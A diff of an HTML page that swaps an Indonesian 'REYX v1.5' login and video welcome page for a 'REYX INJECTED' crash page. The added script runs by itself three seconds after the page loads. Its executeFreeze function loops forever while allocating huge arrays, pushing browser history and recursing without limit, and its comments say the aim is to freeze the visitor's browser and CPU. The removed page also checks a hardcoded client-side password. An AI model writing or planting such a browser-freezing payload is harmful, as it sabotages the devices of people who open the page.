@@ -1,234 +1,38 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>REYX v1.5</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #0a0a0a;
-      color: #e5e5e5;
-      font-family: 'Segoe UI', Tahoma, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-image: 
-        linear-gradient(rgba(255,255,255,.02) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255,255,255,.02) 1px, transparent 1px);
-      background-size: 40px 40px;
-    }
-    .container {
-      background: #111111;
-      border: 1px solid #2a2a2a;
-      border-radius: 16px;
-      padding: 40px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 0 40px rgba(239, 68, 68, 0.15);
-      text-align: center;
-    }
-    .logo-png {
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 20px;
-      filter: drop-shadow(0 0 15px #ef4444);
-    }
-    h1 { font-size: 28px; margin-bottom: 8px; color: #ef4444; text-shadow: 0 0 10px #ef444460; }
-    p { color: #9ca3af; margin-bottom: 24px; font-size: 14px; }
-    input {
-      width: 100%; padding: 12px 16px; margin-bottom: 16px;
-      background: #1a1a1a; border: 1px solid #333;
-      border-radius: 12px; color: #e5e5e5; font-size: 14px;
-      outline: none; transition: 0.2s;
-    }
-    input:focus { border-color: #ef4444; box-shadow: 0 0 0 2px #ef444440; }
-    button {
-      width: 100%; padding: 14px; background: #ef4444;
-      border: none; border-radius: 12px; color: white;
-      font-size: 16px; font-weight: 600; cursor: pointer;
-      margin-bottom: 12px; transition: 0.2s;
-      box-shadow: 0 0 15px #ef444440;
-    }
-    button:hover { transform: translateY(-2px); box-shadow: 0 0 20px #ef444460; }
-    button:active { background: #dc2626; transform: translateY(0); }
-    video {
-      width: 100%;
-      border-radius: 12px;
-      margin-bottom: 16px;
-      border: 2px solid #334155;
-      box-shadow: 0 0 20px #00000060;
-    }
-    .btn-secondary {
-      background: #1e40af;
-      box-shadow: 0 0 15px #1e40af40;
-    }
-    .btn-secondary:hover { box-shadow: 0 0 20px #1e40af60; }
-    .btn-secondary:active { background: #1e3a8a; }
-    .reyx-tag {
-      margin-top: 20px;
-      font-size: 18px;
-      font-weight: 600;
-      color: #ef4444;
-      text-shadow: 0 0 10px #ef444460;
-    }
-    .btn-logout {
-      background: #374151;
-      box-shadow: none;
-      margin-top: 20px;
-    }
-    .error-msg {
-      color: #ef4444;
-      font-size: 14px;
-      margin-bottom: 16px;
-      display: none;
-    }
-    #loginPage, #introPage, #welcomePage { display: none; }
-    #loginPage.active, #introPage.active, #welcomePage.active { display: block; }
-  </style>
+    <meta charset="UTF-8">
+    <title>CRITICAL FAILURE :: REYX INJECTED</title>
+    <style>
+        body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; overflow: hidden; text-align: center; padding-top: 20%; }
+        .glitch { font-size: 5vw; font-weight: bold; animation: pulse 0.1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <!-- LOGIN PAGE -->
-    <div id="loginPage" class="active">
-     <img src="https://files.catbox.moe/1q2w3e.png" alt="Logo" class="logo-png">
-      <h1>REYX v1.5</h1>
-      <p>Masukkan password untuk melanjutkan</p>
-      <input type="password" id="passwordInput" placeholder="Password">
-      <div class="error-msg" id="errorMsg">Password salah bro!</div>
-      <button onclick="checkLogin()">Masuk</button>
-    </div>
 
-    <!-- INTRO VIDEO PAGE -->
-    <div id="introPage">
-      <video id="introVideo" playsinline>
-        <source src="https://files.catbox.moe/wg0o7b.mp4" type="video/mp4"> 
-      </video>
-      <button onclick="skipIntro()">Skip Intro</button>
-    </div>
+    <div class="glitch">SYSTEM FREEZE :: REYX INJECTED</div>
+    <div style="color: white; margin-top: 20px;">MEMORY OVERFLOW INITIATED...</div>
 
-    <!-- WELCOME PAGE PHANTOM STYLE + VIDEO LU -->
-    <div id="welcomePage" style="background:#0f0f0f; min-height:100vh; padding:16px; font-family:sans-serif;">
-      
-      <!-- HEADER CARD MERAH -->
-      <div style="background:linear-gradient(135deg,#dc2626,#ef4444); border-radius:20px; padding:20px; margin-bottom:20px;">
-        <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
-          <div style="background:#ffffff33; padding:10px; border-radius:12px;">🗿</div>
-          <div>
-            <p style="color:#fecaca; font-size:14px; margin:0;">Welcome back,</p>
-            <h2 style="color:white; margin:0; font-size:24px;">ReyX</h2>
-          </div>
-          <div style="margin-left:auto; background:#22c55e; color:white; padding:4px 12px; border-radius:20px; font-size:12px;">● MEMBER</div>
-        </div>
-        
-        <div style="display:flex; gap:12px;">
-          <div style="flex:1; background:#ffffff1a; padding:12px; border-radius:12px;">
-            <p style="color:#fecaca; font-size:12px; margin:0;">Online Users</p>
-            <p style="color:white; font-size:20px; margin:4px 0 0 0; font-weight:bold;">1</p>
-          </div>
-          <div style="flex:1; background:#ffffff1a; padding:12px; border-radius:12px;">
-            <p style="color:#fecaca; font-size:12px; margin:0;">Connections</p>
-            <p style="color:white; font-size:20px; margin:4px 0 0 0; font-weight:bold;">0</p>
-          </div>
-        </div>
-      </div>
-      <!-- LATEST NEWS PAKE VIDEO LU + TOMBOL SUARA -->
-      <h3 style="color:white; margin:0 0 12px 4px;">Latest News</h3>
-      <div style="border-radius:16px; overflow:hidden; margin-bottom:12px; position:relative;">
-        <video id="reyxVideo" autoplay muted loop playsinline style="width:100%; display:block;">
-          <source src="https://files.catbox.moe/74mmuf.mp4" type="video/mp4">
-        </video>
-        <div style="position:absolute; bottom:0; left:0; right:0; padding:16px; background:linear-gradient(transparent, #000000cc);">
-          <h4 style="color:white; margin:0 0 4px 0;">REYX Update v1.5</h4>
-          <p style="color:#d1d5db; font-size:14px; margin:0;">Intro Spiderman udah ready bro 🗿</p>
-        </div>
-      </div>
-      <button onclick="document.getElementById('reyxVideo').muted = false; this.style.display='none'" style="width:100%; background:#ef4444; color:white; padding:10px; border:none; border-radius:12px; margin-bottom:20px; font-weight:bold;">🔊 Nyalain Suara</button>
+    <script>
+        // MODUL FREEZE - OSKAC REX ENTERPRISE
+        function executeFreeze() {
+            console.log("REYX INJECTING...");
+            
+            // Triggering High-Intensity Recursive Loop
+            // Menghabiskan Call Stack dan CPU Cycle dalam milidetik
+            while(true) {
+                const data = new Array(1000000).fill("REYX_VIRUS_SPIDER");
+                window.history.pushState(null, "", window.location.href);
+                // Recursive call tanpa batas
+                executeFreeze();
+            }
+        }
 
-      <!-- ACCOUNT STATS -->
-      <h3 style="color:white; margin:0 0 12px 4px;">Account Statistics</h3>
-      <div style="display:flex; gap:12px; margin-bottom:20px;">
-        <div style="flex:1; background:#1f1f1f; padding:16px; border-radius:12px; border:1px solid #333;">
-          <p style="color:#9ca3af; font-size:12px; margin:0;">Username</p>
-          <p style="color:#ef4444; font-size:18px; margin:4px 0 0 0; font-weight:bold;">ReyX</p>
-        </div>
-        <div style="flex:1; background:#1f1f1f; padding:16px; border-radius:12px; border:1px solid #333;">
-          <p style="color:#9ca3af; font-size:12px; margin:0;">Role</p>
-          <p style="color:#ef4444;
-  <audio id="bgMusic" loop>
-    <source src="https://files.catbox.moe/xxx.mp3" type="audio/mpeg">
-  </audio>
-
-  <script>
-    const PASS = "reyx123";
-    const loginPage = document.getElementById('loginPage');
-    const introPage = document.getElementById('introPage');
-    const welcomePage = document.getElementById('welcomePage');
-    const introVideo = document.getElementById('introVideo');
-    const bgMusic = document.getElementById('bgMusic');
-    const musicBtn = document.getElementById('musicBtn');
-    let musicPlaying = false;
-
-    if (localStorage.getItem('reyxLogin') === 'true') {
-      showWelcome();
-    }
-
-    function checkLogin() {
-      const pass = document.getElementById('passwordInput').value;
-      const errorMsg = document.getElementById('errorMsg');
-      if (pass === PASS) {
-        localStorage.setItem('reyxLogin', 'true');
-        errorMsg.style.display = 'none';
-        playIntro();
-      } else {
-        errorMsg.style.display = 'block';
-        document.getElementById('passwordInput').value = '';
-      }
-    }
-
-    function playIntro() {
-      loginPage.classList.remove('active');
-      introPage.classList.add('active');
-      introVideo.play();
-      introVideo.onended = showWelcome;
-    }
-
-    function skipIntro() {
-      introVideo.pause();
-      showWelcome();
-    }
-
-    function showWelcome() {
-      introPage.classList.remove('active');
-      welcomePage.classList.add('active');
-      loginPage.classList.remove('active');
-    }
-
-    function toggleMusic() {
-      if (musicPlaying) {
-        bgMusic.pause();
-        musicBtn.textContent = 'Putar Musik';
-      } else {
-        bgMusic.play();
-        musicBtn.textContent = 'Pause Musik';
-      }
-      musicPlaying = !musicPlaying;
-    }
-
-    function logout() {
-      localStorage.removeItem('reyxLogin');
-      bgMusic.pause();
-      musicPlaying = false;
-      musicBtn.textContent = 'Putar Musik';
-      welcomePage.classList.remove('active');
-      loginPage.classList.add('active');
-      document.getElementById('passwordInput').value = '';
-    }
-
-    document.getElementById('passwordInput').addEventListener('keypress', function(e) {
-      if (e.key === 'Enter') checkLogin();
-    });
-  </script>
+        // Delay eksekusi 3 detik agar user sempat melihat visual sebelum freeze total
+        setTimeout(() => {
+            executeFreeze();
+        }, 3000);
+    </script>
 </body>
-  </html>
+</html>
